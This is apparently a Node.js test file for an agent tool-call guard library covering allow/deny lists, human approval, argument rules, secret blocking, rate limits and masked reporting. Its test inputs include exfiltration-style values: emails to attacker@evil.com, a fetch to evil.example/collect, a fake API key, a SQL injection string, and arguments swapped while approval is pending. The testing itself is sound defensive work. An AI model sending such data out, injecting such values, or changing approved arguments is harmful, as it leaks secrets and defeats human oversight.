// Agent Guard: allow/deny, approvals, argument rules, secret blocking, rate limits, and safe reporting.
import assert from 'node:assert/strict'
import { test } from 'node:test'
import { createRequire } from 'node:module'
import { createGuard, checkCall, previewArgs, GuardBlockedError } from '../dist/guard.mjs'

const tools = {
  lookup_order: async ({ id }) => ({ id, status: 'shipped' }),
  send_email: async ({ to }) => `sent to ${to}`,
  refund: async ({ amount }) => `refunded ${amount}`,
  delete_account: async () => 'deleted',
  fetch_url: async ({ url }) => `fetched ${url}`,
}

test('allow list and deny list (with wildcards)', async () => {
  const g = createGuard({ policy: { allow: ['lookup_*', 'send_email'], deny: ['delete_*'] } }).wrapAll(tools)
  assert.deepEqual(await g.lookup_order({ id: 1 }), { id: 1, status: 'shipped' })
  await assert.rejects(g.refund({ amount: 5 }), err => err instanceof GuardBlockedError && /not on the allow list/.test(err.message))
  await assert.rejects(g.delete_account(), /deny list/)
  assert.match(new GuardBlockedError('x', 'y').message, /Do not retry/, 'the message tells the model to stop')
})

test('human approval: yes runs the tool, no or missing approver blocks it', async () => {
  const asked = []
  const yes = createGuard({ policy: { requireApproval: ['refund'] }, approve: call => { asked.push(call.tool); return true } }).wrapAll(tools)
  assert.equal(await yes.refund({ amount: 5 }), 'refunded 5')
  assert.deepEqual(asked, ['refund'])
  const no = createGuard({ policy: { requireApproval: ['refund'] }, approve: async () => false }).wrapAll(tools)
  await assert.rejects(no.refund({ amount: 5 }), /did not approve/)
  const none = createGuard({ policy: { requireApproval: [/^ref/] } }).wrapAll(tools)
  await assert.rejects(none.refund({ amount: 5 }), /no approver/)
  const throws = createGuard({ policy: { requireApproval: ['refund'] }, approve: () => { throw new Error('slack down') } }).wrapAll(tools)
  await assert.rejects(throws.refund({ amount: 5 }), /did not approve/, 'an approver error fails closed')
})

test('argument rules: allowed email domains, max length, deny pattern', async () => {
  const g = createGuard({ policy: { args: { send_email: { to: { allowDomains: ['acme.com'], maxLength: 100 } }, lookup_order: { id: { deny: /drop|;/i } } } } }).wrapAll(tools)
  assert.equal(await g.send_email({ to: 'sam@acme.com' }), 'sent to sam@acme.com')
  assert.equal(await g.send_email({ to: 'ops@eu.acme.com' }), 'sent to ops@eu.acme.com', 'subdomains allowed')
  await assert.rejects(g.send_email({ to: 'attacker@evil.com' }), /evil\.com, which is not an allowed domain/)
  await assert.rejects(g.send_email({ to: ['sam@acme.com', 'x@evil.com'] }), /evil\.com/)
  await assert.rejects(g.send_email({ to: 'sam@acme.com' + 'x'.repeat(200) }), /longer than 100/)
  await assert.rejects(g.lookup_order({ id: '1; DROP TABLE' }), /blocked pattern/)
})

test('secrets in arguments are blocked (the classic exfiltration path); allowed hosts', async () => {
  const g = createGuard({ policy: { allowHosts: ['api.acme.com'] } }).wrapAll(tools)
  await assert.rejects(g.send_email({ to: 'a@acme.com', body: 'key is sk-proj-abcdefghijklmnopqrstuvwxyz123456' }), /API key or private key/)
  await assert.rejects(g.fetch_url({ url: 'https://evil.example/collect?d=1' }), /evil\.example is not an allowed host/)
  assert.equal(await g.fetch_url({ url: 'https://api.acme.com/v1/orders' }), 'fetched https://api.acme.com/v1/orders')
  const off = createGuard({ policy: { blockSecrets: false } }).wrapAll(tools)
  assert.match(await off.send_email({ to: 'sk-proj-abcdefghijklmnopqrstuvwxyz123456' }), /sent/)
})

test('rate limits: per minute and per run', async () => {
  let t = 0
  const g = createGuard({ policy: { rateLimit: { perMinute: 2, perRun: 3 } }, now: () => t })
  const lookup = g.wrap('lookup_order', tools.lookup_order)
  await lookup({ id: 1 }); await lookup({ id: 2 })
  await assert.rejects(lookup({ id: 3 }), /more than 2 tool calls in a minute/)
  t = 61_000
  await lookup({ id: 3 })
  await assert.rejects(lookup({ id: 4 }), /more than 3 tool calls in this run/)
  g.newRun()
  t = 130_000
  assert.ok(await lookup({ id: 5 }))
})

test('events: every decision is reported with secrets masked, never the full arguments', async () => {
  const local = []
  const posted = []
  const fetchFn = async (url, init) => { posted.push({ url, auth: init.headers.Authorization, body: JSON.parse(init.body) }); return new Response('{}') }
  const g = createGuard({ agent: 'support-bot', policy: { allow: ['send_email'], blockSecrets: false }, onEvent: e => local.push(e), apiKey: 'av_test', apiUrl: 'https://api.test/v1/scan', fetchFn })
  const w = g.wrapAll(tools)
  await w.send_email({ to: 'a@acme.com', note: 'token sk-proj-abcdefghijklmnopqrstuvwxyz123456 ' + 'y'.repeat(300) })
  await assert.rejects(w.refund({ amount: 1 }))
  await g.flush()
  assert.deepEqual(local.map(e => [e.tool, e.decision]), [['send_email', 'allowed'], ['refund', 'blocked']])
  assert.equal(posted.length, 1)
  assert.equal(posted[0].url, 'https://api.test/v1/guard/events')
  assert.equal(posted[0].auth, 'Bearer av_test')
  const preview = posted[0].body.events[0].argsPreview
  assert.doesNotMatch(preview, /abcdefghijklmnop/, 'secret masked')
  assert.ok(preview.length <= 600)
  assert.equal(posted[0].body.events[0].agent, 'support-bot')
  const failing = createGuard({ policy: {}, apiKey: 'k', fetchFn: async () => { throw new Error('offline') } }).wrapAll(tools)
  assert.ok(await failing.lookup_order({ id: 1 }), 'reporting failures never break the agent')
})

test('checkCall and previewArgs work on their own (dry runs)', () => {
  assert.deepEqual(checkCall({ allow: ['a'] }, 'a', []), { ok: true, needsApproval: false })
  assert.equal(checkCall({ allow: ['a'] }, 'b', []).ok, false)
  assert.equal(previewArgs([{ k: 'ghp_' + 'a'.repeat(36) }]), '{"k":"ghp_****"}')
})

test('CommonJS build works too', () => {
  const require = createRequire(import.meta.url)
  const cjs = require('../dist/guard.js')
  assert.equal(typeof cjs.createGuard, 'function')
})

// Reported by an outside reviewer (Nov 2026): a global/sticky RegExp keeps lastIndex between .test() calls,
// which could flip the same call between allowed and blocked.
test('global or sticky patterns give the same decision every time', async () => {
  const deny = /send_/g
  const g = createGuard({ policy: { deny: [deny] } }).wrapAll(tools)
  for (let i = 0; i < 4; i++) await assert.rejects(g.send_email({ to: 'a@acme.com' }), /deny list/)
  const argRule = createGuard({ policy: { args: { send_email: { to: { deny: /evil/gy } } } } }).wrapAll(tools)
  for (let i = 0; i < 4; i++) await assert.rejects(argRule.send_email({ to: 'evil@x.com' }), /blocked pattern/)
  const allow = createGuard({ policy: { allow: [/^lookup/g] } }).wrapAll(tools)
  for (let i = 0; i < 4; i++) assert.deepEqual(await allow.lookup_order({ id: i }), { id: i, status: 'shipped' })
})

// Reported by an outside reviewer (Nov 2026): arguments were checked before approval and passed to the tool
// after it, so a change made while waiting for a person could run something that was never checked.
test('arguments changed while waiting for approval are blocked', async () => {
  const ran = []
  const send = async ({ to }) => { ran.push(to); return `sent to ${to}` }
  const policy = { requireApproval: ['send_email'], args: { send_email: { to: { allowDomains: ['acme.com'] } } } }
  let pending
  const g = createGuard({ policy, approve: () => new Promise(r => { pending = r }) }).wrapAll({ send_email: send })
  const args = { to: 'boss@acme.com' }
  const call = g.send_email(args)
  await new Promise(r => setImmediate(r))
  args.to = 'attacker@evil.com' // changed after the check, before approval
  pending(true)
  await assert.rejects(call, /changed while waiting for approval/)
  assert.deepEqual(ran, [], 'the tool never ran')
  // Unchanged arguments still run after approval, and two approvals in flight do not mix.
  const ok = createGuard({ policy, approve: async () => true }).wrapAll({ send_email: send })
  assert.deepEqual(await Promise.all([ok.send_email({ to: 'a@acme.com' }), ok.send_email({ to: 'b@acme.com' })]), ['sent to a@acme.com', 'sent to b@acme.com'])
})
